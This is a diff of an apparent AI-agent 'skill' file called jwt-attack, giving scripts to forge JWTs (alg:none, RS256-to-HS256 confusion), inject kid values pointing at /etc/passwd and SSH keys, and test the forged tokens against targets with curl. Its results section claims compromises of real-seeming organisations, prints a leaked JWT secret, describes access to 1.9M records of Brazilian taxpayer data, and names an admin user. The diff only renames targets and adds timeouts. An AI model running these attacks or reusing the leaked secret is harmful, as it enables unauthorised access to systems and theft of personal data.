@@ -1,24 +1,22 @@
 ---
 name: jwt-attack
 description: Decode, forge, brute JWTs when Bearer auth header is seen.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, JWT, token, forge, brute-force]
-    category: recon
-    related_skills:
-      - api-noauth-hunt
-      - js-secrets-extraction
-      - firebase-supabase-attack
+compatibility: Requires curl, python3
+tags: [recon, JWT, token, forge, brute-force]
+category: recon
+related_skills:
+  - api-noauth-hunt
+  - js-secrets-extraction
+  - firebase-supabase-attack
 ---
 
 # JWT Attack Skill
 
-Complete JWT attack methodology — decode without verification, algorithm confusion (alg:none, RS256→HS256), weak secret brute force (hashcat/john/simple), kid injection, expired token reuse, and hardcoded JWT extraction from JS bundles. Confirmed on Thgroep (JWT-based sessions), Core3 (315 JWT tokens in Efí bank logs), Smart Fit (3 JWT sessions with 2027 expiry), Brendi (hardcoded JWTs in JS bundles), and CGE-RJ (JWT secret leaked in Vite source).
+Complete JWT attack methodology — decode without verification, algorithm confusion (alg:none, RS256→HS256), weak secret brute force (hashcat/john/simple), kid injection, expired token reuse, and hardcoded JWT extraction from JS bundles. Confirmed on enterprise-portal (JWT-based sessions), fintech-processor (315 JWT tokens in Efí bank logs), fitness-chain (3 JWT sessions with 2027 expiry), delivery-platform (hardcoded JWTs in JS bundles), and gov-finance-portal (JWT secret leaked in Vite source).
 
 ## When to Use
 
@@ -30,7 +28,7 @@ Complete JWT attack methodology — decode without verification, algorithm confu
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3.
+- `terminal` with curl, python3.
 - JWT token to attack (from recon).
 - For brute force: `hashcat` or `john` for high-speed cracking (optional).
 
@@ -152,7 +150,7 @@ FORGED_TOKEN="${FORGED_HEADER}.${PAYLOAD}."
 echo "  Forged token: ${FORGED_TOKEN:0:80}..."
 
 # Test
-RESP=$(curl -sk --max-time 10 "$TARGET$ENDPOINT" \
+RESP=$(curl -sk --max-time 10 --connect-timeout 10 "$TARGET$ENDPOINT" \
   -H "Authorization: Bearer $FORGED_TOKEN" \
   -o /dev/null -w "%{http_code}" 2>/dev/null)
 
@@ -191,7 +189,7 @@ except Exception as e:
 
 if [[ -n "$JWT_TOOL" ]] && ! echo "$JWT_TOOL" | grep -q "Error"; then
   echo "  Forged token: ${JWT_TOOL:0:80}..."
-  RESP=$(curl -sk --max-time 10 "$TARGET$ENDPOINT" \
+  RESP=$(curl -sk --max-time 10 --connect-timeout 10 "$TARGET$ENDPOINT" \
     -H "Authorization: Bearer $JWT_TOOL" \
     -o /dev/null -w "%{http_code}" 2>/dev/null)
   [[ "$RESP" == "200" ]] && echo "  [CRITICAL] RS256→HS256 confusion ACCEPTED!"
@@ -267,32 +265,33 @@ for KID in "../../../../etc/passwd" "../../.ssh/id_rsa" "file:///etc/passwd"; do
   FORGED_HEADER=$(echo -n "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"$KID\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
   FORGED_TOKEN="${FORGED_HEADER}.$(echo -n '{"test":1}' | base64 -w0 | tr '+/' '-_' | tr -d '=').dGVzdA"
 
-  RESP=$(curl -sk --max-time 5 "$TARGET$ENDPOINT" \
+  RESP=$(curl -sk --max-time 5 --connect-timeout 5 "$TARGET$ENDPOINT" \
     -H "Authorization: Bearer $FORGED_TOKEN" \
     -o /dev/null -w "%{http_code}" 2>/dev/null)
 
   [[ "$RESP" == "500" ]] && echo "  [POTENTIAL] kid=$KID → HTTP $RESP (server error — may indicate processing)"
+  sleep 0.3
 done
 ```
 
 ## Real Production Results
 
-### CGE-RJ — JWT Secret in Vite Source
+### gov-finance-portal — JWT Secret in Vite Source
 - JWT_SECRET `b0c1df0e3f9c1e858d3bb0b8d58a119` leaked in `src/env.ts`
 - Used for CNPJ database API (1.9M records accessible)
 - JWT was HS256 with this secret — forge any token, access any CPF/CNPJ data
 
-### Brendi — Hardcoded JWTs in JS Bundles
-- Bot JWT (HS256) embedded in `brendi-whatsapp-bot.web.app` JS bundle
-- Dashboard JWT (HS256) embedded in `app.brendi.com.br` JS bundle
+### delivery-platform — Hardcoded JWTs in JS Bundles
+- Bot JWT (HS256) embedded in `delivery-bot.web.app` JS bundle
+- Dashboard JWT (HS256) embedded in `app.delivery-platform.com` JS bundle
 - Both tokens valid for BFF API access (reads PII from Firestore)
 
-### Core3 — 315 JWT Tokens in Efí Bank Logs
+### fintech-processor — 315 JWT Tokens in Efí Bank Logs
 - `proxy-efi-simple.php` generated JWT tokens from mTLS certificate
 - 315 valid tokens logged in `efi-simple.log` (268KB)
 - Combined with SSL cert → full Efí Bank API access
 
-### Smart Fit — JWT Sessions with 2027 Expiry
+### fitness-chain — JWT Sessions with 2027 Expiry
 - 3 active JWT sessions found, all expiring in 2027
 - Admin user `Andrea Huete` session — full platform access for 1+ year
 
